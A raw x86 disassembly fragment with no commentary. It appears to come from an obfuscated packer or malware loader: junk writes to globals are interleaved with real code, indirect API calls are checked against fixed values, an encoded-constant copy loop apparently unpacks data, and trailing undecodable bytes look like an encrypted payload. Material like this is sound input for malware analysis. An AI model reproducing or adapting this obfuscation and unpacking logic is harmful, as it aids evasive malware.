  42105f:	jne    0x42088a
  421065:	push   0xf
  421067:	lea    eax,[esp+0x44]
  42106b:	xor    DWORD PTR ds:0x429193,0x42919b
  421075:	push   eax
  421076:	push   0x4285bb
  42107b:	adc    DWORD PTR ds:0x429193,0x7895
  421085:	push   0x4285cf
  42108a:	push   0x4285ef
  42108f:	call   esi
  421091:	imul   eax,eax,0x300000
  421097:	cmp    eax,0x1b00000
  42109c:	jne    0x42088a
  4210a2:	lea    eax,[esp+0x1b8]
  4210a9:	push   eax
  4210aa:	push   0x42862b
  4210af:	sub    DWORD PTR ds:0x4291bf,0x42918b
  4210b9:	call   DWORD PTR ds:0x42a797
  4210bf:	mov    DWORD PTR ds:0x429187,0x3d95
  4210c9:	cmp    eax,0xffffffff
  4210cc:	mov    DWORD PTR ds:0x42917f,0x79ad
  4210d6:	jne    0x42088a
  4210dc:	lea    eax,[esp+0x78]
  4210e0:	add    DWORD PTR ds:0x42914f,0x6022
  4210ea:	push   eax
  4210eb:	neg    DWORD PTR ds:0x42917f
  4210f1:	push   0x428617
  4210f6:	add    DWORD PTR ds:0x42917b,0x4291e7
  421100:	call   DWORD PTR ds:0x42a7ab
  421106:	mov    DWORD PTR ds:0x42916f,0x4f36
  421110:	cmp    eax,0xffffffff
  421113:	mov    DWORD PTR ds:0x429197,0x71f8
  42111d:	jne    0x42088a
  421123:	xor    DWORD PTR ds:0x4291b7,0x540c
  42112d:	push   0xf
  42112f:	or     DWORD PTR ds:0x42914b,0x42916b
  421139:	lea    eax,[esp+0x44]
  42113d:	and    DWORD PTR ds:0x4291ab,0x3361
  421147:	push   eax
  421148:	sub    DWORD PTR ds:0x4291bb,0x5c7b
  421152:	push   0x42866b
  421157:	adc    DWORD PTR ds:0x4291ab,0x4291cf
  421161:	push   0x42867f
  421166:	xor    DWORD PTR ds:0x429183,0x4291b7
  421170:	push   0x42869f
  421175:	or     DWORD PTR ds:0x4291af,0x4291cf
  42117f:	call   esi
  421181:	imul   eax,eax,0x300000
  421187:	mov    DWORD PTR ds:0x429157,0x112c
  421191:	cmp    eax,0x1b00000
  421196:	jne    0x42088a
  42119c:	or     DWORD PTR ds:0x42914f,0x1a1c
  4211a6:	lea    eax,[esp+0x1b8]
  4211ad:	push   eax
  4211ae:	sub    DWORD PTR ds:0x4291eb,0xb4e
  4211b8:	push   0x4286db
  4211bd:	not    DWORD PTR ds:0x429153
  4211c3:	call   DWORD PTR ds:0x42a797
  4211c9:	mov    DWORD PTR ds:0x4291d7,0x34b9
  4211d3:	cmp    eax,0xffffffff
  4211d6:	mov    DWORD PTR ds:0x4291bb,0x68d6
  4211e0:	jne    0x42088a
  4211e6:	lea    eax,[esp+0x78]
  4211ea:	push   eax
  4211eb:	sub    DWORD PTR ds:0x4291a7,0x429183
  4211f5:	push   0x4286c7
  4211fa:	sub    DWORD PTR ds:0x42919f,0xfe
  421204:	call   DWORD PTR ds:0x42a7ab
  42120a:	mov    DWORD PTR ds:0x4291a3,0x162e
  421214:	cmp    eax,0xffffffff
  421217:	jne    0x42088a
  42121d:	add    DWORD PTR ds:0x42918f,0x39d
  421227:	push   0xf
  421229:	lea    eax,[esp+0x44]
  42122d:	push   eax
  42122e:	sbb    DWORD PTR ds:0x4291df,0x4c8c
  421238:	push   0x42871b
  42123d:	push   0x42872f
  421242:	push   0x42874f
  421247:	call   esi
  421249:	sub    DWORD PTR ds:0x42914f,0x429163
  421253:	imul   eax,eax,0x300000
  421259:	mov    DWORD PTR ds:0x42918b,0x5962
  421263:	cmp    eax,0x1b00000
  421268:	jne    0x42088a
  42126e:	add    DWORD PTR ds:0x4291a3,0x4291cb
  421278:	lea    eax,[esp+0x1b8]
  42127f:	or     DWORD PTR ds:0x4291ab,0x4619
  421289:	push   eax
  42128a:	push   0x42878b
  42128f:	and    DWORD PTR ds:0x42916f,0x4291ef
  421299:	call   DWORD PTR ds:0x42a797
  42129f:	mov    DWORD PTR ds:0x4291ef,0x2004
  4212a9:	cmp    eax,0xffffffff
  4212ac:	mov    DWORD PTR ds:0x42918b,0x62c6
  4212b6:	jne    0x42088a
  4212bc:	and    DWORD PTR ds:0x4291d3,0x5eb4
  4212c6:	lea    eax,[esp+0x78]
  4212ca:	adc    DWORD PTR ds:0x42917f,0x4918
  4212d4:	push   eax
  4212d5:	or     DWORD PTR ds:0x42919b,0x429153
  4212df:	push   0x428777
  4212e4:	sbb    DWORD PTR ds:0x429197,0x429157
  4212ee:	call   DWORD PTR ds:0x42a7ab
  4212f4:	mov    DWORD PTR ds:0x42914f,0x13e7
  4212fe:	cmp    eax,0xffffffff
  421301:	mov    DWORD PTR ds:0x4291cf,0xa62
  42130b:	jne    0x42088a
  421311:	xor    DWORD PTR ds:0x42915b,0x4291bb
  42131b:	push   0xf
  42131d:	lea    eax,[esp+0x44]
  421321:	or     DWORD PTR ds:0x4291b3,0x2cef
  42132b:	push   eax
  42132c:	push   0x4287cb
  421331:	push   0x4287df
  421336:	sub    DWORD PTR ds:0x4291a3,0x42918f
  421340:	push   0x4287ff
  421345:	call   esi
  421347:	imul   eax,eax,0x300000
  42134d:	mov    DWORD PTR ds:0x429193,0x43ec
  421357:	cmp    eax,0x1b00000
  42135c:	mov    DWORD PTR ds:0x4291c7,0x18cb
  421366:	jne    0x42088a
  42136c:	add    DWORD PTR ds:0x4291af,0x5057
  421376:	lea    eax,[esp+0x1b8]
  42137d:	or     DWORD PTR ds:0x4291c3,0x48df
  421387:	push   eax
  421388:	and    DWORD PTR ds:0x4291e3,0x7c0c
  421392:	push   0x42883b
  421397:	and    DWORD PTR ds:0x4291f7,0x4291d7
  4213a1:	call   DWORD PTR ds:0x42a797
  4213a7:	cmp    eax,0xffffffff
  4213aa:	jne    0x42088a
  4213b0:	or     DWORD PTR ds:0x4291cb,0x5541
  4213ba:	lea    eax,[esp+0x78]
  4213be:	sub    DWORD PTR ds:0x4291f7,0x686a
  4213c8:	push   eax
  4213c9:	xor    DWORD PTR ds:0x4291ef,0x4291eb
  4213d3:	push   0x428827
  4213d8:	add    DWORD PTR ds:0x4291bb,0x4894
  4213e2:	call   DWORD PTR ds:0x42a7ab
  4213e8:	mov    DWORD PTR ds:0x42914b,0x5d36
  4213f2:	cmp    eax,0xffffffff
  4213f5:	mov    DWORD PTR ds:0x42918b,0x63d2
  4213ff:	jne    0x42088a
  421405:	adc    DWORD PTR ds:0x4291d3,0x6d
  42140f:	push   0xf
  421411:	xor    DWORD PTR ds:0x4291df,0x4291b3
  42141b:	lea    eax,[esp+0x44]
  42141f:	xor    DWORD PTR ds:0x42914f,0x245a
  421429:	push   eax
  42142a:	adc    DWORD PTR ds:0x42915f,0x29d1
  421434:	push   0x42887b
  421439:	push   0x42888f
  42143e:	sbb    DWORD PTR ds:0x42914f,0x429163
  421448:	push   0x4288af
  42144d:	adc    DWORD PTR ds:0x42917f,0x4291a3
  421457:	call   esi
  421459:	imul   eax,eax,0x300000
  42145f:	cmp    eax,0x1b00000
  421464:	jne    0x42088a
  42146a:	mov    DWORD PTR ds:0x4291cf,0x5dc8
  421474:	lea    eax,[esp+0x1b8]
  42147b:	add    DWORD PTR ds:0x42919b,0x4291ab
  421485:	push   eax
  421486:	not    DWORD PTR ds:0x429153
  42148c:	push   0x4288eb
  421491:	call   DWORD PTR ds:0x42a797
  421497:	mov    DWORD PTR ds:0x4291e7,0x183e
  4214a1:	cmp    eax,0xffffffff
  4214a4:	jne    0x42088a
  4214aa:	lea    eax,[esp+0x78]
  4214ae:	xor    DWORD PTR ds:0x4291d7,0x57b8
  4214b8:	push   eax
  4214b9:	push   0x4288d7
  4214be:	add    DWORD PTR ds:0x4291af,0x1e81
  4214c8:	call   DWORD PTR ds:0x42a7ab
  4214ce:	mov    DWORD PTR ds:0x4291c3,0x328a
  4214d8:	cmp    eax,0xffffffff
  4214db:	mov    DWORD PTR ds:0x4291f7,0x13f0
  4214e5:	jne    0x42088a
  4214eb:	push   0xf
  4214ed:	lea    eax,[esp+0x44]
  4214f1:	adc    DWORD PTR ds:0x4291c3,0x429173
  4214fb:	push   eax
  4214fc:	xor    DWORD PTR ds:0x4291cf,0x725b
  421506:	push   0x42892b
  42150b:	adc    DWORD PTR ds:0x4291bb,0x39d7
  421515:	push   0x42893f
  42151a:	xor    DWORD PTR ds:0x42918b,0x4291a7
  421524:	push   0x42895f
  421529:	call   esi
  42152b:	adc    DWORD PTR ds:0x4291ab,0x4291f7
  421535:	imul   eax,eax,0x300000
  42153b:	mov    DWORD PTR ds:0x4291cf,0x3d0e
  421545:	cmp    eax,0x1b00000
  42154a:	jne    0x42088a
  421550:	lea    eax,[esp+0x1b8]
  421557:	xor    DWORD PTR ds:0x429197,0x42919f
  421561:	push   eax
  421562:	push   0x42899b
  421567:	or     DWORD PTR ds:0x42915b,0x3d87
  421571:	call   DWORD PTR ds:0x42a797
  421577:	mov    DWORD PTR ds:0x4291bf,0x3132
  421581:	cmp    eax,0xffffffff
  421584:	jne    0x42088a
  42158a:	add    DWORD PTR ds:0x4291df,0x6129
  421594:	lea    eax,[esp+0x78]
  421598:	mov    DWORD PTR ds:0x42915b,0x7683
  4215a2:	push   eax
  4215a3:	push   0x428987
  4215a8:	adc    DWORD PTR ds:0x4291d3,0x4f30
  4215b2:	call   DWORD PTR ds:0x42a7ab
  4215b8:	mov    DWORD PTR ds:0x42918f,0x2474
  4215c2:	cmp    eax,0xffffffff
  4215c5:	jne    0x42088a
  4215cb:	and    DWORD PTR ds:0x4291c3,0x7c44
  4215d5:	push   0xf
  4215d7:	lea    eax,[esp+0x44]
  4215db:	push   eax
  4215dc:	push   0x4289db
  4215e1:	sub    DWORD PTR ds:0x42914f,0x6ca1
  4215eb:	push   0x4289ef
  4215f0:	sbb    DWORD PTR ds:0x42916f,0x4291cf
  4215fa:	push   0x428a0f
  4215ff:	call   esi
  421601:	xor    DWORD PTR ds:0x4291eb,0x4291a3
  42160b:	imul   eax,eax,0x300000
  421611:	mov    DWORD PTR ds:0x4291a7,0x6fd3
  42161b:	cmp    eax,0x1b00000
  421620:	mov    DWORD PTR ds:0x4291f7,0x26fc
  42162a:	jne    0x42088a
  421630:	lea    eax,[esp+0x1b8]
  421637:	push   eax
  421638:	push   0x428a4b
  42163d:	call   DWORD PTR ds:0x42a797
  421643:	cmp    eax,0xffffffff
  421646:	jne    0x42088a
  42164c:	lea    eax,[esp+0x78]
  421650:	push   eax
  421651:	push   0x428a37
  421656:	call   DWORD PTR ds:0x42a7ab
  42165c:	cmp    eax,0xffffffff
  42165f:	jne    0x42088a
  421665:	push   0xf
  421667:	lea    eax,[esp+0x44]
  42166b:	push   eax
  42166c:	push   0x428a8b
  421671:	push   0x428a9f
  421676:	push   0x428abf
  42167b:	call   esi
  42167d:	imul   eax,eax,0x300000
  421683:	cmp    eax,0x1b00000
  421688:	jne    0x42088a
  42168e:	lea    eax,[esp+0x1b8]
  421695:	push   eax
  421696:	push   0x428afb
  42169b:	call   DWORD PTR ds:0x42a797
  4216a1:	cmp    eax,0xffffffff
  4216a4:	jne    0x42088a
  4216aa:	lea    eax,[esp+0x78]
  4216ae:	push   eax
  4216af:	push   0x428ae7
  4216b4:	call   DWORD PTR ds:0x42a7ab
  4216ba:	cmp    eax,0xffffffff
  4216bd:	jne    0x42088a
  4216c3:	push   0xf
  4216c5:	lea    eax,[esp+0x44]
  4216c9:	push   eax
  4216ca:	push   0x428b3b
  4216cf:	push   0x428b4f
  4216d4:	push   0x428b6f
  4216d9:	call   esi
  4216db:	imul   eax,eax,0x300000
  4216e1:	cmp    eax,0x1b00000
  4216e6:	jne    0x42088a
  4216ec:	lea    eax,[esp+0x1b8]
  4216f3:	push   eax
  4216f4:	push   0x428bab
  4216f9:	call   DWORD PTR ds:0x42a797
  4216ff:	cmp    eax,0xffffffff
  421702:	jne    0x42088a
  421708:	lea    eax,[esp+0x78]
  42170c:	push   eax
  42170d:	push   0x428b97
  421712:	call   DWORD PTR ds:0x42a7ab
  421718:	cmp    eax,0xffffffff
  42171b:	jne    0x42088a
  421721:	push   0xf
  421723:	lea    eax,[esp+0x44]
  421727:	push   eax
  421728:	push   0x428beb
  42172d:	push   0x428bff
  421732:	push   0x428c1f
  421737:	call   esi
  421739:	imul   eax,eax,0x300000
  42173f:	cmp    eax,0x1b00000
  421744:	jne    0x42088a
  42174a:	lea    eax,[esp+0x1b8]
  421751:	push   eax
  421752:	push   0x428c5b
  421757:	call   DWORD PTR ds:0x42a797
  42175d:	cmp    eax,0xffffffff
  421760:	jne    0x42088a
  421766:	lea    eax,[esp+0x78]
  42176a:	push   eax
  42176b:	push   0x428c47
  421770:	call   DWORD PTR ds:0x42a7ab
  421776:	cmp    eax,0xffffffff
  421779:	jne    0x42088a
  42177f:	push   0xf
  421781:	lea    eax,[esp+0x44]
  421785:	push   eax
  421786:	push   0x428c9b
  42178b:	push   0x428caf
  421790:	push   0x428ccf
  421795:	call   esi
  421797:	imul   eax,eax,0x300000
  42179d:	cmp    eax,0x1b00000
  4217a2:	jne    0x42088a
  4217a8:	lea    eax,[esp+0x1b8]
  4217af:	push   eax
  4217b0:	push   0x428d0b
  4217b5:	call   DWORD PTR ds:0x42a797
  4217bb:	cmp    eax,0xffffffff
  4217be:	jne    0x42088a
  4217c4:	lea    eax,[esp+0x78]
  4217c8:	push   eax
  4217c9:	push   0x428cf7
  4217ce:	call   DWORD PTR ds:0x42a7ab
  4217d4:	cmp    eax,0xffffffff
  4217d7:	jne    0x42088a
  4217dd:	push   0xf
  4217df:	lea    eax,[esp+0x44]
  4217e3:	push   eax
  4217e4:	push   0x428d4b
  4217e9:	push   0x428d5f
  4217ee:	push   0x428d7f
  4217f3:	call   esi
  4217f5:	imul   eax,eax,0x300000
  4217fb:	cmp    eax,0x1b00000
  421800:	jne    0x42088a
  421806:	lea    eax,[esp+0x1b8]
  42180d:	push   eax
  42180e:	push   0x428dbb
  421813:	call   DWORD PTR ds:0x42a797
  421819:	cmp    eax,0xffffffff
  42181c:	jne    0x42088a
  421822:	mov    eax,DWORD PTR [esp+0x3c]
  421826:	cmp    eax,0xf89c85a2
  42182b:	je     0x42188a
  421831:	mov    eax,DWORD PTR [esp+0x18]
  421835:	mov    ecx,DWORD PTR [esp+0x38]
  421839:	xor    eax,edi
  42183b:	add    eax,ebx
  42183d:	cmp    eax,ecx
  42183f:	je     0x42188a
  421845:	mov    eax,ds:0x42830b
  42184a:	mov    eax,DWORD PTR [eax+0x194]
  421850:	mov    ecx,DWORD PTR [eax]
  421852:	mov    eax,DWORD PTR [ecx+0x3c]
  421855:	push   DWORD PTR ds:0x4283eb
  42185b:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  42185f:	push   DWORD PTR ds:0x42818f
  421865:	add    eax,ecx
  421867:	mov    ecx,DWORD PTR ds:0x42830b
  42186d:	mov    ecx,DWORD PTR [ecx+0x194]
  421873:	push   DWORD PTR [ecx]
  421875:	call   eax
  421877:	mov    ecx,DWORD PTR ds:0x42830b
  42187d:	mov    ecx,DWORD PTR [ecx+0x1cc]
  421883:	mov    DWORD PTR [ecx],eax
  421885:	jmp    0x421ab7
  42188a:	mov    eax,DWORD PTR [esp+0x18]
  42188e:	mov    ecx,DWORD PTR [esp+0x60]
  421892:	xor    eax,edi
  421894:	add    eax,ebx
  421896:	cmp    eax,ecx
  421898:	jne    0x421901
  42189e:	mov    eax,DWORD PTR [esp+0x18]
  4218a2:	mov    ecx,DWORD PTR ds:0x42830b
  4218a8:	mov    ecx,DWORD PTR [ecx+0x198]
  4218ae:	xor    eax,edi
  4218b0:	add    eax,ebx
  4218b2:	cmp    eax,DWORD PTR [ecx]
  4218b4:	jne    0x4218da
  4218ba:	mov    eax,DWORD PTR [esp+0x18]
  4218be:	push   0xf89c85a1
  4218c3:	xor    eax,edi
  4218c5:	add    eax,ebx
  4218c7:	push   eax
  4218c8:	push   0xf89c85bd
  4218cd:	push   DWORD PTR [esp+0x18]
  4218d1:	push   DWORD PTR [esp+0x28]
  4218d5:	call   0x41b9fd
  4218da:	push   DWORD PTR [esp+0xc]
  4218de:	push   DWORD PTR [esp+0x1c]
  4218e2:	call   0x401000
  4218e7:	mov    eax,DWORD PTR [esp+0x18]
  4218eb:	xor    eax,edi
  4218ed:	add    eax,ebx
  4218ef:	mov    ds:0x428397,eax
  4218f4:	mov    eax,DWORD PTR [esp+0x18]
  4218f8:	xor    eax,edi
  4218fa:	add    eax,ebx
  4218fc:	mov    ds:0x42838f,eax
  421901:	mov    eax,DWORD PTR [esp+0x2c]
  421905:	test   eax,eax
  421907:	je     0x421ab7
  42190d:	lea    eax,[esp+0x78]
  421911:	mov    DWORD PTR [esp+0x64],0xf152c3a
  421919:	push   eax
  42191a:	mov    DWORD PTR [esp+0x78],0x712ed2f
  421922:	mov    DWORD PTR [esp+0x74],0x373fc09
  42192a:	push   0x428da7
  42192f:	mov    DWORD PTR [esp+0x70],0x72670ad9
  421937:	call   DWORD PTR ds:0x42a7ab
  42193d:	cmp    eax,0xffffffff
  421940:	jne    0x42088a
  421946:	push   0xf
  421948:	lea    eax,[esp+0x44]
  42194c:	push   eax
  42194d:	push   0x428dfb
  421952:	push   0x428e0f
  421957:	push   0x428e2f
  42195c:	call   esi
  42195e:	imul   eax,eax,0x300000
  421964:	cmp    eax,0x1b00000
  421969:	jne    0x42088a
  42196f:	lea    eax,[esp+0x1b8]
  421976:	push   eax
  421977:	push   0x428e6b
  42197c:	call   DWORD PTR ds:0x42a797
  421982:	cmp    eax,0xffffffff
  421985:	jne    0x42088a
  42198b:	call   0x41b69e
  421990:	mov    eax,DWORD PTR [esp+0x34]
  421994:	mov    eax,DWORD PTR [esp+0xc]
  421998:	mov    DWORD PTR [esp+0x30],eax
  42199c:	mov    eax,DWORD PTR [esp+0x18]
  4219a0:	mov    DWORD PTR [esp+0xc],eax
  4219a4:	mov    eax,eax
  4219a6:	mov    eax,ds:0x42830b
  4219ab:	mov    ecx,DWORD PTR [eax+0x1c0]
  4219b1:	mov    edx,DWORD PTR [ecx]
  4219b3:	and    DWORD PTR [esp+0x14],0x0
  4219b8:	mov    esi,0xfabdbed6
  4219bd:	add    edx,esi
  4219bf:	adc    DWORD PTR [esp+0x14],0xffffffff
  4219c4:	mov    ecx,0x8a29a13f
  4219c9:	xor    edx,ecx
  4219cb:	mov    DWORD PTR [esp+0x20],edx
  4219cf:	mov    edx,DWORD PTR [esp+0x14]
  4219d3:	xor    edx,0x0
  4219d6:	cmp    DWORD PTR [esp+0x20],0x70941fe8
  4219de:	mov    DWORD PTR [esp+0x24],edx
  4219e2:	jne    0x4219f1
  4219e8:	cmp    edx,0xffffffff
  4219eb:	je     0x421a5a
  4219f1:	mov    eax,DWORD PTR [eax+0x1c8]
  4219f7:	mov    eax,DWORD PTR [eax]
  4219f9:	cdq    
  4219fa:	add    eax,esi
  4219fc:	adc    edx,0xffffffff
  4219ff:	and    DWORD PTR [esp+0x14],0x0
  421a04:	xor    edx,0x0
  421a07:	mov    DWORD PTR [esp+0x1c],edx
  421a0b:	mov    edx,DWORD PTR [esp+0xc]
  421a0f:	mov    DWORD PTR [esp+0x10],edx
  421a13:	xor    eax,ecx
  421a15:	add    DWORD PTR [esp+0x10],esi
  421a19:	mov    edx,DWORD PTR [esp+0x10]
  421a1d:	adc    DWORD PTR [esp+0x14],0xffffffff
  421a22:	xor    edx,ecx
  421a24:	mov    DWORD PTR [esp+0x20],edx
  421a28:	mov    edx,DWORD PTR [esp+0x14]
  421a2c:	xor    edx,0x0
  421a2f:	mov    DWORD PTR [esp+0x24],edx
  421a33:	cmp    DWORD PTR [esp+0x20],eax
  421a37:	jne    0x421a49
  421a3d:	mov    eax,DWORD PTR [esp+0x1c]
  421a41:	cmp    edx,eax
  421a43:	je     0x421a5a
  421a49:	mov    eax,DWORD PTR [esp+0xc]
  421a4d:	add    eax,DWORD PTR [esp+0x30]
  421a51:	mov    DWORD PTR [esp+0xc],eax
  421a55:	jmp    0x421ab7
  421a5a:	mov    eax,ds:0x42838f
  421a5f:	mov    edx,DWORD PTR ds:0x428397
  421a65:	xor    eax,edx
  421a67:	mov    ds:0x42838f,eax
  421a6c:	mov    edx,DWORD PTR ds:0x42838f
  421a72:	mov    eax,DWORD PTR [esp+0x2c]
  421a76:	add    DWORD PTR [eax],edx
  421a78:	mov    edx,DWORD PTR [esp+0xc]
  421a7c:	mov    eax,ds:0x42838f
  421a81:	xor    edx,edi
  421a83:	add    edx,ebx
  421a85:	xor    ebx,ebx
  421a87:	add    edx,esi
  421a89:	adc    ebx,0xffffffff
  421a8c:	xor    edi,edi
  421a8e:	xor    edx,ecx
  421a90:	xor    ebx,0x0
  421a93:	add    eax,esi
  421a95:	adc    edi,0xffffffff
  421a98:	xor    eax,ecx
  421a9a:	xor    edi,0x0
  421a9d:	cmp    eax,edx
  421a9f:	jne    0x421ab7
  421aa5:	cmp    edi,ebx
  421aa7:	jne    0x421ab7
  421aad:	mov    eax,ds:0x42838f
  421ab2:	mov    ds:0x428397,eax
  421ab7:	lea    eax,[esp+0x78]
  421abb:	push   eax
  421abc:	push   0x428e57
  421ac1:	call   DWORD PTR ds:0x42a7ab
  421ac7:	cmp    eax,0xffffffff
  421aca:	jne    0x42088a
  421ad0:	push   0xf
  421ad2:	lea    eax,[esp+0x44]
  421ad6:	push   eax
  421ad7:	push   0x428eab
  421adc:	push   0x428ebf
  421ae1:	push   0x428edf
  421ae6:	call   DWORD PTR ds:0x42a7c7
  421aec:	imul   eax,eax,0x300000
  421af2:	cmp    eax,0x1b00000
  421af7:	jne    0x42088a
  421afd:	lea    eax,[esp+0x1b8]
  421b04:	push   eax
  421b05:	push   0x428f0b
  421b0a:	call   DWORD PTR ds:0x42a797
  421b10:	cmp    eax,0xffffffff
  421b13:	jne    0x42088a
  421b19:	mov    eax,ds:0x42830b
  421b1e:	push   0x4
  421b20:	add    eax,0x1cc
  421b25:	push   eax
  421b26:	lea    eax,[esp+0x3c]
  421b2a:	push   eax
  421b2b:	call   0x421b3f
  421b30:	mov    eax,DWORD PTR [esp+0x34]
  421b34:	mov    eax,DWORD PTR [eax]
  421b36:	pop    edi
  421b37:	pop    esi
  421b38:	pop    ebx
  421b39:	mov    esp,ebp
  421b3b:	pop    ebp
  421b3c:	ret    0xc
  421b3f:	push   ebp
  421b40:	mov    ebp,esp
  421b42:	sub    esp,0x10
  421b45:	sub    DWORD PTR ds:0x429153,ebx
  421b4b:	mov    eax,0xf89c85a1
  421b50:	and    ecx,DWORD PTR ds:0x42914b
  421b56:	mov    DWORD PTR [ebp-0x4],eax
  421b59:	and    DWORD PTR ds:0x429167,0x0
  421b63:	jmp    0x421b75
  421b68:	mov    edx,DWORD PTR ds:0x429167
  421b6e:	inc    edx
  421b6f:	mov    DWORD PTR ds:0x429167,edx
  421b75:	cmp    DWORD PTR ds:0x429167,0x1c
  421b7c:	jae    0x421bcb
  421b82:	cmp    DWORD PTR ds:0x429167,0xc
  421b89:	jge    0x421bcb
  421b8f:	jmp    0x421bac
  421b94:	push   DWORD PTR [ebp-0x28]
  421b97:	push   0x428152
  421b9c:	push   0x42810e
  421ba1:	push   0x400000
  421ba6:	call   DWORD PTR ds:0x42a79b
  421bac:	cmp    DWORD PTR ds:0x429167,0xb
  421bb3:	jne    0x421bc6
  421bb9:	mov    edx,DWORD PTR ds:0x429167
  421bbf:	inc    edx
  421bc0:	mov    DWORD PTR ds:0x429167,edx
  421bc6:	jmp    0x421b68
  421bcb:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  421bd2:	or     edx,0x5b7d
  421bd8:	mov    ecx,DWORD PTR [ebp-0x4]
  421bdb:	push   esi
  421bdc:	mov    DWORD PTR ds:0x42918b,0x1a
  421be6:	cmp    DWORD PTR ds:0x42918b,0x0
  421bed:	je     0x421c25
  421bf3:	cmp    DWORD PTR ds:0x42918b,0x26
  421bfa:	ja     0x421c25
  421c00:	jmp    0x421c13
  421c05:	push   0x4386
  421c0a:	push   DWORD PTR [ebp-0x14]
  421c0d:	call   DWORD PTR ds:0x42a79f
  421c13:	mov    edx,DWORD PTR ds:0x42918b
  421c19:	dec    edx
  421c1a:	mov    DWORD PTR ds:0x42918b,edx
  421c20:	jmp    0x421be6
  421c25:	mov    edx,0x75108ac
  421c2a:	xor    ecx,edx
  421c2c:	mov    esi,0x3272f3
  421c31:	push   edi
  421c32:	mov    edi,DWORD PTR [ebp+0x10]
  421c35:	add    ecx,esi
  421c37:	cmp    ecx,edi
  421c39:	mov    DWORD PTR ds:0x42916f,0x60ec
  421c43:	je     0x42414b
  421c49:	movzx  ecx,WORD PTR ds:0x4291f7
  421c50:	adc    DWORD PTR ds:0x4291cf,ecx
  421c56:	mov    ecx,DWORD PTR [ebp-0x4]
  421c59:	mov    edi,DWORD PTR [ebp+0x10]
  421c5c:	inc    DWORD PTR ds:0x4291d3
  421c62:	xor    eax,eax
  421c64:	and    DWORD PTR ds:0x4291b7,0x2b27
  421c6e:	xor    ecx,edx
  421c70:	add    ecx,esi
  421c72:	add    DWORD PTR ds:0x42914b,0x714
  421c7c:	add    edi,0xfabdbed6
  421c82:	mov    DWORD PTR ds:0x429173,0x79de
  421c8c:	adc    eax,0xffffffff
  421c8f:	or     DWORD PTR ds:0x4291b3,0x42917f
  421c99:	xor    eax,0x0
  421c9c:	adc    DWORD PTR ds:0x4291e7,0x4ab7
  421ca6:	mov    DWORD PTR [ebp-0xc],eax
  421ca9:	mov    DWORD PTR ds:0x42914b,0x1e
  421cb3:	cmp    DWORD PTR ds:0x42914b,0x0
  421cba:	je     0x421d0b
  421cc0:	cmp    DWORD PTR ds:0x42914b,0x8
  421cc7:	jge    0x421d0b
  421ccd:	jmp    0x421cdd
  421cd2:	push   0x4291eb
  421cd7:	call   DWORD PTR ds:0x42a7a3
  421cdd:	cmp    DWORD PTR ds:0x42914b,0x9
  421ce4:	jne    0x421cf8
  421cea:	xor    eax,eax
  421cec:	add    eax,DWORD PTR ds:0x42914b
  421cf2:	dec    eax
  421cf3:	mov    ds:0x42914b,eax
  421cf8:	xor    eax,eax
  421cfa:	xor    eax,DWORD PTR ds:0x42914b
  421d00:	dec    eax
  421d01:	mov    ds:0x42914b,eax
  421d06:	jmp    0x421cb3
  421d0b:	push   ebx
  421d0c:	xor    ebx,ebx
  421d0e:	xor    edi,0x8a29a13f
  421d14:	mov    eax,ecx
  421d16:	add    eax,0xfabdbed6
  421d1b:	adc    ebx,0xffffffff
  421d1e:	xor    eax,0x8a29a13f
  421d23:	xor    ebx,0x0
  421d26:	cmp    eax,edi
  421d28:	jne    0x421d41
  421d2e:	cmp    ebx,DWORD PTR [ebp-0xc]
  421d31:	je     0x424145
  421d37:	jmp    0x421d41
  421d3c:	mov    esi,0x3272f3
  421d41:	mov    eax,DWORD PTR [ebp-0x4]
  421d44:	mov    edi,DWORD PTR [ebp-0x8]
  421d47:	xor    edi,edx
  421d49:	add    edi,esi
  421d4b:	mov    esi,DWORD PTR [ebp+0x8]
  421d4e:	imul   edi,ecx
  421d51:	mov    ebx,DWORD PTR [ebp+0xc]
  421d54:	xor    eax,edx
  421d56:	add    eax,ecx
  421d58:	mov    al,BYTE PTR [ebx+eax*1+0x3272f3]
  421d5f:	mov    BYTE PTR [edi+esi*1],al
  421d62:	mov    eax,DWORD PTR [ebp-0x8]
  421d65:	mov    esi,DWORD PTR [ebp+0x10]
  421d68:	xor    eax,edx
  421d6a:	xor    ebx,ebx
  421d6c:	add    esi,0xfabdbed6
  421d72:	adc    ebx,0xffffffff
  421d75:	lea    ecx,[ecx+eax*1+0x3272f3]
  421d7c:	xor    edi,edi
  421d7e:	xor    esi,0x8a29a13f
  421d84:	xor    ebx,0x0
  421d87:	mov    eax,ecx
  421d89:	add    eax,0xfabdbed6
  421d8e:	adc    edi,0xffffffff
  421d91:	xor    eax,0x8a29a13f
  421d96:	xor    edi,0x0
  421d99:	cmp    eax,esi
  421d9b:	jne    0x421d3c
  421da1:	cmp    edi,ebx
  421da3:	jne    0x421d3c
  421da9:	jmp    0x424145
  421dae:	sbb    ah,bl
  421db0:	cmp    ch,BYTE PTR [edi-0x46]
  421db3:	xchg   BYTE PTR [esi],al
  421db5:	xchg   BYTE PTR [edx-0x68],bl
  421db8:	dec    esi
  421db9:	push   esp
  421dba:	pushf  
  421dbb:	(bad)  
  421dbd:	enter  0xb16f,0x82
  421dc1:	add    DWORD PTR [eax],0x5c
  421dc4:	add    DWORD PTR [ebx-0x642a9862],0x2d
  421dcb:	jge    0x421d7d
  421dcd:	add    BYTE PTR [ebx],ch
  421dcf:	out    dx,eax
  421dd0:	or     BYTE PTR [ebx+0xe],dh
  421dd3:	in     al,0xd2
  421dd5:	out    dx,al
  421dd6:	and    DWORD PTR [edi-0x788bfb3],esi
  421ddc:	and    cl,BYTE PTR [ebx+0x31bacff8]
  421de2:	add    ch,BYTE PTR [esi]
  421de4:	push   0x7c
  421de6:	sbb    al,0xb7
  421de8:	add    BYTE PTR [ecx+0x40],al
  421deb:	inc    esi
  421dec:	adc    eax,0xc5c9a801
  421df1:	icebp  
  421df2:	and    al,0x40
  421df4:	dec    edi
  421df5:	inc    di
  421df7:	pop    ebp
  421df8:	cmp    esp,DWORD PTR ds:0xebcf518
  421dfe:	mov    eax,ds:0xeea6162d
  421e03:	in     al,0xa0
  421e05:	inc    ecx
  421e06:	scas   eax,DWORD PTR es:[edi]
  421e07:	loop   0x421e00
  421e09:	fwait
  421e0a:	xchg   ebp,eax
  421e0b:	lahf   
  421e0c:	xchg   esp,eax
  421e0d:	scas   eax,DWORD PTR es:[edi]
  421e0e:	pop    ss
  421e0f:	lock jmp 0x421dd8
  421e12:	or     ch,BYTE PTR [edi+0x1fb80e04]
  421e18:	jne    0x421dd1
